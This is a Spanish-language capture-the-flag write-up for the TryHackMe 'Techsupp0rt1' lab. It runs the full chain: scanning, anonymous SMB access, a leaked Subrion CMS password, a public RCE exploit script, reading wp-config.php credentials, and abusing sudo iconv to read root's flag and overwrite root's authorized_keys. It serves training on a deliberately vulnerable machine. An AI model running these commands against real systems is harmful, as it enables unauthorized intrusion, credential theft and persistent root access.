

# Writeup Techsupp0rt1 - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | 10.114.140.68 |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux (Ubuntu) |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración SMB](#enumeración-smb)
3. [Explotación Subrion CMS](#explotación-subrion-cms)
4. [Escalada de Privilegios (Sudo iconv)](#escalada-de-privilegios-sudo-iconv)
5. [Flags](#flags)

---

## Reconocimiento

Iniciamos la fase de reconocimiento con un escaneo exhaustivo de puertos para mapear los servicios expuestos y determinar posibles vectores de entrada:

```bash
nmap -p- -A -sS 10.114.140.68 -oN scan_techscam.txt
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu
80/tcp  open  http        Apache httpd 2.4.18
139/tcp open  netbios-ssn Samba
445/tcp open  netbios-ssn Samba
```

Se identifica el servicio HTTP activo en el puerto 80. Procedemos con una enumeración de directorios mediante `gobuster` para localizar recursos ocultos:

```bash
gobuster dir -u http://10.114.140.68/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-progress

```

```bash
gobuster dir -u http://10.114.140.68/ -w common.txt
```
```text
/wordpress            (Status: 301)
/test                 (Status: 301)
```

Ante la ausencia de vectores inmediatos en el servidor web, se procede a auditar los recursos compartidos mediante el protocolo SMB:

```bash
smbmap -H 10.114.140.68 

```

![Listado de shares SMB](/imgTechSupport/image.png)

La enumeración revela acceso de lectura anónimo al recurso compartido `websrv`. Procederemos a inspeccionar su contenido en busca de información sensible.

Se establece una conexión anónima y se localiza el archivo `enter.txt`. Tras analizarlo y decodificar la información con CyberChef, se obtienen las credenciales de administración para la plataforma "Subrion CMS" (`admin:Scam2021`).

---

Utilizamos las credenciales obtenidas para acceder al panel administrativo en `/subrion/panel/`. Se identifica la versión 4.2.1 de Subrion CMS, lo que nos permite buscar exploits conocidos mediante `searchsploit`.

```bash
searchsploit subrion 4.2

```

La búsqueda arroja un exploit de ejecución remota de comandos (RCE) mediante la subida arbitraria de archivos. Utilizaremos el script en Python identificado para automatizar el compromiso del servidor.

```bash
python3 49876.py -u http://10.114.140.19/subrion/panel/ -l admin -p
Scam2021

```

![Ejecución del exploit automatizado 49876.py](/imgTechSupport/image2.png)
*Ejecución exitosa del exploit y obtención de reverse shell.*

Acceso inicial establecido con éxito. No obstante, la shell obtenida presenta limitaciones de interactividad, lo que requiere una fase de estabilización.


Para obtener un acceso más robusto, auditamos el archivo `/etc/passwd` para identificar usuarios válidos y buscamos credenciales adicionales en archivos de configuración como `wp-config.php`.

```bash
$ cat /etc/passwd
scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash
mysql:x:111:119:MySQL Server,,,:/nonexistent:/bin/false'

```
```bash
ls -lha ../../wordpress
total 220K
drwxr-xr-x  5 www-data www-data 4.0K May 29  2021 .
drwxr-xr-x  5 root     root     4.0K May 29  2021 ..
-rw-r--r--  1 www-data www-data  543 May 29  2021 .htaccess
-rwxr-xr-x  1 www-data www-data  405 Feb  6  2020 index.php
-rwxr-xr-x  1 www-data www-data  20K Jan  1  2021 license.txt
-rwxr-xr-x  1 www-data www-data 7.2K Dec 30  2020 readme.html
-rwxr-xr-x  1 www-data www-data 7.0K Jan 21  2021 wp-activate.php
drwxr-xr-x  9 www-data www-data 4.0K May 13  2021 wp-admin
-rwxr-xr-x  1 www-data www-data  351 Feb  6  2020 wp-blog-header.php
-rwxr-xr-x  1 www-data www-data 2.3K Feb 17  2021 wp-comments-post.php
-rwxr-xr-x  1 www-data www-data 3.0K May 29  2021 wp-config.php
```
```bash
cat ../../wordpress/wp-config.php
```
```php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```
Las credenciales recuperadas del archivo de configuración permiten establecer una conexión estable vía SSH con el usuario `scamsite`.

```bash
ssh scamsite@10.114.140.19
```
```text
scamsite@TechSupport:~$ whoami
scamsite
```

![Inicio de sesion con SSH](/imgTechSupport/image3.png)

*Inicio de sesión exitoso con SSH al usuario scamsite.*

---

## Escalada de Privilegios

> **El objetivo final:**
> Una vez que tenemos un "pie dentro" de la máquina ( Foothold ), nuestro usuario suele tener permisos limitados. El objetivo de la escalada de privilegios es encontrar fallos de configuración, binarios vulnerables o servicios mal protegidos que nos permitan convertirnos en el administrador o, en el caso de Windows, en el todopoderoso NT AUTHORITY\SYSTEM.

## Escalada de Privilegios (Sudo iconv)

Revisamos los privilegios sudo del usuario actual:

```bash
sudo -l

```

![Validación de privilegios de sudo para scamsite](/imgTechSupport/image4.png)
*Resultados de sudo -l mostrando permisos sobre iconv.*

La auditoría de privilegios revela una configuración de `sudo` altamente vulnerable que permite la ejecución de `/usr/bin/iconv` con privilegios de root sin contraseña.

El sistema le permite a nuestro usuario ejecutar `/usr/bin/iconv` como **root** sin necesidad de teclear ninguna contraseña. `iconv` es una utilidad de conversión de tablas de caracteres (por ejemplo de UTF-8 a ASCII).

Con esta técnica, no necesitamos molestarnos en escalar a una consola Root completa. Apuntamos el cañón de `iconv` directamente contra nuestro objetivo final, la flag del administrador, y la volcamos obligatoriamente en nuestra pantalla forzando una conversión nula (de 8859_1 a 8859_1):

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt

```

![Obtención y lectura de la flag de root utilizando sudo iconv](/imgTechSupport/image5.png)

*Aprovechamiento de la utilidad iconv para dumpear ilegítimamente el contenido protegido de root.txt.*

Como vector alternativo para obtener una shell completa de root, utilizaremos `iconv` para inyectar una clave pública SSH en el archivo `authorized_keys` del administrador.

```bash
ssh-keygen -t ed25519
```
*(Generamos el par de claves y recuperamos la clave pública)*
Después de generar la key en la máquina que vamos a usar para obtener acceso root, vamos a copiar la clave pública y vamos a añadirla al archivo authorized_keys del usuario root en la máquina objetivo.

```bash
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKvrm+nhmw9m4JN7D46QXNp5/pxabtTCxCHasxksulGu kali@kali" | sudo iconv -f 8859_1 -t 8859_1 -o /root/.ssh/authorized_keys
```
Y por último, nos conectaremos a la máquina usando nuestra clave privada recién generada, y podremos acceder sin problema como root a la máquina.

```bash
ssh root@10.128.139.156 -i id_ed25519    
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


120 packages can be updated.
88 updates are security updates.


Last login: Sun Nov 21 11:17:57 2021
root@TechSupport:~# whoami
root
```